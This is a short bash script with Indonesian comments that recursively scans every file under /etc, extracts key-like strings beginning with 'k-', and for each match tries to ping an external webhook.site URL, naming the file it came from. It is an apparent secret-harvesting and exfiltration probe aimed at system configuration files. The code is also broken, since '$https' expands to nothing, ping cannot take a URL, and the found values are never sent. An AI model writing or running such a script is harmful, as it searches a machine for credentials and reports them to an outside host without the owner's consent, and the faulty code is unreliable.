#!/bin/bash
# Target folder
folder_path="/etc"

# Cari semua file dalam folder /etc (rekursif)
files=$(find "$folder_path" -type f 2>/dev/null)

# Loop setiap file dan cari string yang cocok
for file in $files; do
    # Pastikan file bisa dibaca
    if [[ -r "$file" ]]; then
        targets=$(strings "$file" | grep -oE 'k-[A-Za-z0-9_-]{0,30}')
        for target in $targets; do
            echo "Pinging $https://webhook.site/a09f44a3-886c-4aed-84a0-718998def226 dari file $file..."
            ping -c 2 "$https://webhook.site/a09f44a3-886c-4aed-84a0-718998def226"
            echo "-----------------------------"
        done
    fi
done